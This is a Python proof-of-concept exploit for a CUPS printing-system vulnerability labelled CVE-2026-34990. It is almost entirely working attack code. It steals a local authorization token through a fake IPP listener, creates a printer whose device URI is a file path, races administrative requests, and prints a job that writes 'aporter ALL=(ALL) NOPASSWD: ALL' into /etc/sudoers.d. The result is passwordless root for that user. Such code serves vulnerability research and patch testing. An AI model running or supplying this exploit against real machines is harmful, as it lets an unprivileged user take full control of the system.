#!/usr/bin/env python3
import socket
import struct
import threading
import time
import os
import gzip

HOST = "127.0.0.1"
CUPS_PORT = 631
CAPTURE_PORT = 9189

TARGET = "/etc/sudoers.d/aporter"
PRINTER = f"cve34990_{os.getpid()}"

# IPP tags
TAG_OPERATION = 0x01
TAG_PRINTER = 0x04
TAG_END = 0x03

TAG_INTEGER = 0x21
TAG_BOOLEAN = 0x22
TAG_NAME = 0x42
TAG_KEYWORD = 0x44
TAG_URI = 0x45
TAG_CHARSET = 0x47
TAG_LANGUAGE = 0x48
TAG_MIMETYPE = 0x49

# IPP operations
OP_PRINT_JOB = 0x0002
OP_RESUME_PRINTER = 0x0011
OP_CUPS_ADD_MODIFY_PRINTER = 0x4003
OP_CUPS_DELETE_PRINTER = 0x4004
OP_CUPS_ACCEPT_JOBS = 0x4008
OP_CUPS_CREATE_LOCAL_PRINTER = 0x4028


def attr(tag, name, value):
    n = name.encode()
    v = value.encode()
    return (
        bytes([tag])
        + struct.pack(">H", len(n))
        + n
        + struct.pack(">H", len(v))
        + v
    )


def raw_attr(tag, name, value):
    n = name.encode()
    return (
        bytes([tag])
        + struct.pack(">H", len(n))
        + n
        + struct.pack(">H", len(value))
        + value
    )


def boolean(name, value):
    return raw_attr(TAG_BOOLEAN, name, b"\x01" if value else b"\x00")


def ipp(op, reqid, operation_attrs, printer_attrs=None, document=b""):
    b = bytearray(struct.pack(">BBHI", 2, 0, op, reqid))
    b.append(TAG_OPERATION)

    for x in operation_attrs:
        b.extend(x)

    if printer_attrs:
        b.append(TAG_PRINTER)
        for x in printer_attrs:
            b.extend(x)

    b.append(TAG_END)
    b.extend(document)
    return bytes(b)


def common():
    return [
        attr(TAG_CHARSET, "attributes-charset", "utf-8"),
        attr(TAG_LANGUAGE, "attributes-natural-language", "en"),
        attr(TAG_NAME, "requesting-user-name", os.getenv("USER", "user")),
    ]


def http_post(path, body, token=None):
    headers = [
        f"POST {path} HTTP/1.1",
        f"Host: {HOST}:{CUPS_PORT}",
        "Content-Type: application/ipp",
        f"Content-Length: {len(body)}",
        "Connection: close",
    ]

    if token:
        headers.append(f"Authorization: Local {token}")

    req = ("\r\n".join(headers) + "\r\n\r\n").encode() + body

    with socket.create_connection((HOST, CUPS_PORT), timeout=2) as s:
        s.sendall(req)
        data = b""
        while True:
            try:
                chunk = s.recv(65535)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break

    return data


class CaptureServer(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.token = None

    def run(self):
        with socket.socket() as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((HOST, CAPTURE_PORT))
            s.listen(5)
            s.settimeout(0.5)

            end = time.time() + 15

            while time.time() < end and not self.token:
                try:
                    conn, _ = s.accept()
                except socket.timeout:
                    continue

                with conn:
                    conn.settimeout(3)
                    data = b""

                    while b"\r\n\r\n" not in data:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        data += chunk

                    text = data.decode("latin1", "ignore")

                    for line in text.splitlines():
                        if line.lower().startswith("authorization: local "):
                            self.token = line.split(None, 2)[2]
                            break

                    if self.token:
                        body = (
                            b"\x02\x00\x00\x01"
                            b"\x01"
                            b"\x47\x00\x12attributes-charset\x00\x05utf-8"
                            b"\x48\x00\x1battributes-natural-language\x00\x02en"
                            b"\x03"
                        )

                        reply = (
                            b"HTTP/1.1 200 OK\r\n"
                            b"Content-Type: application/ipp\r\n"
                            + f"Content-Length: {len(body)}\r\n".encode()
                            + b"Connection: close\r\n\r\n"
                            + body
                        )
                    else:
                        reply = (
                            b'HTTP/1.1 401 Unauthorized\r\n'
                            b'WWW-Authenticate: Local trc="y"\r\n'
                            b'Content-Length: 0\r\n'
                            b'Connection: close\r\n\r\n'
                        )

                    conn.sendall(reply)


def capture_token():
    print("[*] Starting token capture server...")

    server = CaptureServer()
    server.start()

    body = ipp(
        OP_CUPS_CREATE_LOCAL_PRINTER,
        1,
        common() + [
            attr(TAG_URI, "printer-uri", "ipp://localhost:631/")
        ],
        [
            attr(TAG_NAME, "printer-name", "tokenleak"),
            attr(
                TAG_URI,
                "device-uri",
                f"ipp://{HOST}:{CAPTURE_PORT}/ipp/print",
            ),
        ],
    )

    # Vulnerable CUPS should perform this request without admin auth.
    http_post("/", body)

    server.join(5)

    if not server.token:
        raise RuntimeError(
            "No Local authorization token captured. "
            "Target may be patched or configured differently."
        )

    print(f"[+] Captured Local token: {server.token}")
    return server.token


def printer_uri(name):
    return f"ipp://localhost:631/printers/{name}"


def create_file_printer():
    body = ipp(
        OP_CUPS_CREATE_LOCAL_PRINTER,
        2,
        common() + [
            attr(TAG_URI, "printer-uri", "ipp://localhost:631/")
        ],
        [
            attr(TAG_NAME, "printer-name", PRINTER),
            attr(TAG_URI, "device-uri", f"file://{TARGET}"),
        ],
    )

    s = socket.create_connection((HOST, CUPS_PORT), timeout=2)

    req = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {HOST}:{CUPS_PORT}\r\n"
        f"Content-Type: application/ipp\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode() + body

    s.sendall(req)
    return s


def admin(token, op, reqid, attrs=None):
    body = ipp(
        op,
        reqid,
        common() + [
            attr(TAG_URI, "printer-uri", printer_uri(PRINTER))
        ],
        attrs,
    )

    return http_post("/admin/", body, token)


def print_test(token):
    payload = b"aporter ALL=(ALL) NOPASSWD: ALL\n"

    # gzip is accepted by the CUPS raw backend used in the public PoC.
    document = gzip.compress(payload)

    body = ipp(
        OP_PRINT_JOB,
        5000,
        common() + [
            attr(TAG_URI, "printer-uri", printer_uri(PRINTER)),
            attr(
                TAG_MIMETYPE,
                "document-format",
                "application/vnd.cups-raw",
            ),
            attr(TAG_KEYWORD, "compression", "gzip"),
            attr(TAG_NAME, "job-name", "cve34990-proof"),
        ],
        document=document,
    )

    http_post(f"/printers/{PRINTER}", body, token)


def exploit(token):
    print("[*] Creating file:// printer...")
    sock = create_file_printer()

    try:
        # The vulnerable path is racey; repeatedly try to make the
        # temporary printer permanent and submit a job.
        for i in range(100):
            reqid = 1000 + i * 10

            admin(
                token,
                OP_CUPS_ADD_MODIFY_PRINTER,
                reqid,
                [
                    attr(TAG_NAME, "ppd-name", "raw"),
                    boolean("printer-is-shared", True),
                ],
            )

            admin(
                token,
                OP_CUPS_ACCEPT_JOBS,
                reqid + 1,
            )

            admin(
                token,
                OP_RESUME_PRINTER,
                reqid + 2,
            )

            try:
                print_test(token)
            except Exception:
                pass

            if os.path.exists(TARGET):
                print("[+] Vulnerable!")
                print(f"[+] File created: {TARGET}")
                print(f"[+] Owner: {os.stat(TARGET).st_uid}:{os.stat(TARGET).st_gid}")
                print("[+] Contents:")
                print(open(TARGET, "rb").read().decode(errors="replace"))
                return True

            time.sleep(0.02)

    finally:
        sock.close()

    return False


def cleanup(token):
    try:
        admin(token, OP_CUPS_DELETE_PRINTER, 9000)
    except Exception:
        pass


if __name__ == "__main__":
    print("CVE-2026-34990 CUPS PoC")
    print(f"[*] Target file: {TARGET}")

    try:
        token = capture_token()
        ok = exploit(token)

        if ok:
            print("[+] CVE-2026-34990 reproduced successfully.")
        else:
            print("[-] Exploit did not win the race.")

        cleanup(token)

    except Exception as e:
        print(f"[-] {e}")
